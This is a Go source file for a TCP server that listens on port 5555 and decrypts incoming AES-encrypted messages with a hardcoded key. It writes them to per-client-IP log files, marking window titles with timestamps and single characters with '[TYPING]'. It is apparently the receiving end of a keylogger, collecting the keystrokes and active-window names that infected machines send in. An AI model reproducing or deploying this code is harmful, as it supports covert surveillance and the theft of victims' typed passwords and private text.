package main

import (
    "fmt"
    "net"
    "os"
    "time"
    "bytes"
	"log"
	"strings"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"errors"
)

const (
    CONN_HOST = ""
    CONN_PORT = "5555"
    CONN_TYPE = "tcp"
)

func main() {
    // Listen for incoming connections.
    l, err := net.Listen(CONN_TYPE, ":"+CONN_PORT)
    if err != nil {
        fmt.Println("Error listening:", err.Error())
        os.Exit(1)
    }
    // Close the listener when the application closes.
    defer l.Close()
    fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
    for {
        // Listen for an incoming connection.
        conn, err := l.Accept()
        if err != nil {
            fmt.Println("Error accepting: ", err.Error())
            os.Exit(1)
        }

        // Handle connections in a new goroutine.
        go handleRequest(conn)
    }
}

var isTyping = false;

// Handles incoming requests.
func handleRequest(conn net.Conn) {

	CIPHER_KEY := []byte("(danas je danas)")

 
    buf := make([]byte, 1024)

    conn.Read(buf)


    n := bytes.Index(buf, []byte{0})

    t := time.Now()


	decrypted, err := decrypt(CIPHER_KEY, string(buf[:n]));

	if  err != nil {
		log.Println(err)
	} else {

		if strings.Contains(decrypted, "WINDOW") {
			isTyping=false;
			saveInFile(t.Format("\n2006-01-02 15:04:05") + decrypted,   strings.Split((strings.Replace(conn.RemoteAddr().String(),".","",-1)),":")[0] + ".txt")
		} else {

			if(!isTyping && len(decrypted)==1) {
				saveInFile("\n[TYPING]" + decrypted,    strings.Split((strings.Replace(conn.RemoteAddr().String(),".","",-1)),":")[0] + ".txt")
				isTyping=true;
			} else {
				saveInFile(decrypted,   strings.Split((strings.Replace(conn.RemoteAddr().String(),".","",-1)),":")[0] + ".txt")
			}			
		}
	}


    conn.Write([]byte(""));
    conn.Close()
}


func saveInFile(txt string, path string) {

    fmt.Print(txt)
    // If the file doesn't exist, create it, or append to the file
    f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        log.Fatal(err)
    }
    if _, err := f.Write([]byte(txt)); err != nil {
        log.Fatal(err)
    }
    if err := f.Close(); err != nil {
        log.Fatal(err)
    }
}


func decrypt(key []byte, securemess string) (decodedmess string, err error) {
	cipherText, err := base64.URLEncoding.DecodeString(securemess)
	if err != nil {
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}

	if len(cipherText) < aes.BlockSize {
		err = errors.New("Ciphertext block size is too short!")
		return
	}

	//IV needs to be unique, but doesn't have to be secure.
	//It's common to put it at the beginning of the ciphertext.
	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	// XORKeyStream can work in-place if the two arguments are the same.
	stream.XORKeyStream(cipherText, cipherText)

	decodedmess = string(cipherText)
	return
}